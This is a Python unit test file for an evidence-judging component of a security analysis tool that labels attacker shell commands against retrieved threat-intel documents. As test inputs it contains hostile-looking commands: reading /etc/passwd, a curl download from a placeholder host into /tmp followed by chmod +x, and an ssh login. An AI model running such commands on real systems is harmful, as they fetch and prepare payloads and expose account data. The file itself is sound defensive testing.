from __future__ import annotations

import copy

import pytest

from ragin.decision_fusion_v4.benchmark import EvidenceQualityGate
from ragin.decision_fusion_v4.evidence_export import build_evidence_bundle
from ragin.don.evidence_judge import (
    DeterministicEvidenceJudge,
    EvidenceLabel,
    LayaScoringAdapter,
    SufficiencyLabel,
    judge_bundle,
)

pytestmark = pytest.mark.unit


def doc(doc_id: str, title: str, content: str, *, source: str = "synthetic://fixture", status: str = "VALID") -> dict[str, object]:
    return {
        "doc_id": doc_id,
        "title": title,
        "content": content,
        "source": source,
        "provenance_status": status,
        "sanitization_status": "SANITIZED",
        "conflict_status": "NONE",
        "command_patterns": [title],
        "behavior_tags": ["discovery"],
    }


def test_relevant_and_adjacent_documents_are_distinguished() -> None:
    result = DeterministicEvidenceJudge().judge(
        "uname -a",
        [
            doc("d1", "uname", "Direct evidence of host discovery using uname."),
            doc("d2", "crontab", "Evidence of persistence through scheduled tasks."),
        ],
    )
    assert result.candidate_judgments[0].label == EvidenceLabel.SUPPORTED
    assert result.candidate_judgments[1].label == EvidenceLabel.IRRELEVANT
    assert result.sufficiency.label == SufficiencyLabel.SUFFICIENT


def test_partial_and_incomplete_evidence_do_not_become_sufficient() -> None:
    result = DeterministicEvidenceJudge().judge(
        "cat /etc/passwd",
        [doc("d1", "accounts", "Related /etc/passwd file context without a direct behavior statement.")],
    )
    assert result.candidate_judgments[0].label == EvidenceLabel.PARTIAL
    assert result.sufficiency.label == SufficiencyLabel.INSUFFICIENT

    incomplete = DeterministicEvidenceJudge().judge(
        "cat /etc/passwd",
        [doc("d2", "account", "Related context only.")],
    )
    assert incomplete.sufficiency.label == SufficiencyLabel.INSUFFICIENT


def test_conflicting_documents_are_explicitly_abstained() -> None:
    result = DeterministicEvidenceJudge().judge(
        "curl http://example.invalid/payload",
        [
            doc("d1", "curl", "Direct download evidence."),
            doc("d2", "curl", "This contradicts the observed download behavior."),
        ],
    )
    assert result.sufficiency.label == SufficiencyLabel.CONFLICTING
    assert result.sufficiency.contradictory_doc_ids == ["d2"]


def test_ambiguous_shell_command_and_multi_command_context_are_traced() -> None:
    ambiguous = DeterministicEvidenceJudge().judge("echo 'unterminated", [doc("d1", "echo", "Related output")])
    assert ambiguous.context_missing_or_ambiguous is True
    assert ambiguous.sufficiency.label == SufficiencyLabel.UNKNOWN

    multi = DeterministicEvidenceJudge().judge(
        "chmod +x /tmp/x",
        [doc("d1", "chmod", "Direct execution preparation evidence.")],
        preceding_commands=["curl http://example.invalid/x -o /tmp/x"],
    )
    assert multi.candidate_judgments[0].context_status == "PRESENT"
    assert multi.sufficiency.label == SufficiencyLabel.SUFFICIENT


def test_missing_provenance_and_unsupported_behavior_abstain() -> None:
    missing = DeterministicEvidenceJudge().judge(
        "ssh admin@example.invalid",
        [doc("d1", "ssh", "Direct remote access evidence.", source="", status="UNKNOWN")],
    )
    assert missing.candidate_judgments[0].label == EvidenceLabel.UNKNOWN
    assert missing.sufficiency.label == SufficiencyLabel.INSUFFICIENT

    unsupported = DeterministicEvidenceJudge().judge(
        "echo hello",
        [doc("d2", "ssh", "Remote access evidence.")],
    )
    assert unsupported.sufficiency.label == SufficiencyLabel.INSUFFICIENT


def test_laya_adapter_is_disabled_and_probabilities_are_empty() -> None:
    assert LayaScoringAdapter().enabled is False
    result = judge_bundle("uname -a", [doc("d1", "uname", "Direct host discovery evidence.")])
    assert result["probabilities"] == {}
    assert result["contract_version"] == "EVIDENCE_JUDGE_V1"


def test_baseline_gate_is_unchanged_when_judge_field_is_absent() -> None:
    bundle = {
        "session": {"session_id": "synthetic", "current_input": "uname -a"},
        "chrollo": {"skill_level": "novice", "confidence": 0.5, "features_used": [], "feature_values": {}},
        "don_analysis": {"classification": "suspicious", "severity": "low", "confidence": 0.5, "tactics": [], "ttps_seen": [], "iocs": []},
        "retrieval": {
            "retrieval_status": "SUCCESS",
            "backend": "synthetic",
            "query": "uname -a",
            "sub_queries": ["uname -a"],
            "retrieved_count": 1,
            "relevant_count": 1,
            "relevant_doc_ids": ["d1"],
            "query_coverage": {"complete": True},
            "documents": [doc("d1", "uname", "Direct host discovery evidence.")],
            "trace_summary": {"usable_successful_retrieval": True},
        },
    }
    baseline = EvidenceQualityGate().evaluate(bundle)
    judged_bundle = copy.deepcopy(bundle)
    judged_bundle["evidence_judge"] = judge_bundle("uname -a", judged_bundle["retrieval"]["documents"])
    judged = EvidenceQualityGate().evaluate(judged_bundle)
    assert baseline["gate_state"] == "VALID_EVIDENCE"
    assert judged["gate_state"] == "VALID_EVIDENCE"


def test_opt_in_bundle_integration_rejects_unsupported_evidence(monkeypatch: pytest.MonkeyPatch) -> None:
    class Value:
        def __init__(self, value: str) -> None:
            self.value = value

    class Analysis:
        intel_documents = []
        classification = Value("suspicious")
        severity = Value("low")
        confidence = 0.5
        tactics = []
        iocs = []

    monkeypatch.setenv("RAGIN_EVIDENCE_JUDGE_ENABLED", "1")
    bundle = build_evidence_bundle(Analysis(), {"session_id": "synthetic", "classification": {}}, "echo hello")
    assert bundle["evidence_judge"]["contract_version"] == "EVIDENCE_JUDGE_V1"
    assert bundle["evidence_gate_preview"]["gate_state"] == "NO_EVIDENCE"
